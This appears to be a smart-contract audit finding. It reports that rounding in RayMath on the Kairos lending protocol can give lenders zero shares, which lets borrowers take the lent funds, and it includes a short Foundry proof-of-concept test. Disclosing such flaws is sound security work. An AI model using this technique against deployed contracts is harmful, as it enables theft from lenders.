# Borrowers may steal funds from lenders

## Summary

Due to limited precision in RayMath, if an offer is made with TVL > `1e27` which is possible for high decimal tokens then borrowers may steal funds from lenders.

## Vulnerability Detail

If the amount loaned is less than the `LTV*1e27`, then the shares minted to the lender for a position are zero. This lender has no claim to the lent amount in liquidation, and all proceeds go to the borrower. This is because the amount of lender shares is directly minted as the borrowed amount divided by the LTV, which may round to zero.

The following test exemplifies the issue:

```solidity
function testSteal() public {
    BorrowArg[] memory borrowArgs = new BorrowArg[](1);
    Offer memory offer = Offer({
            assetToLend: money,
            loanToValue: 1e27+1,
            duration: 2 weeks,
            expirationDate: block.timestamp + 2 hours,
            tranche: 0,
            collateral: getNft()
        });
    uint256 currentTokenId;

    getFlooz(signer, money, type(uint256).max);

    OfferArg[] memory offerArgs = new OfferArg[](1);
    currentTokenId = getJpeg(BORROWER, nft);
    offer.collateral.id = currentTokenId;

    offerArgs[0] = OfferArg({
        signature: getSignature(offer),
        amount: 1,
        offer: offer
    });
    borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});

    vm.prank(BORROWER);
    kairos.borrow(borrowArgs);

    assertEq(kairos.position(0).share.gt(Ray.wrap(0)), true);
}
```
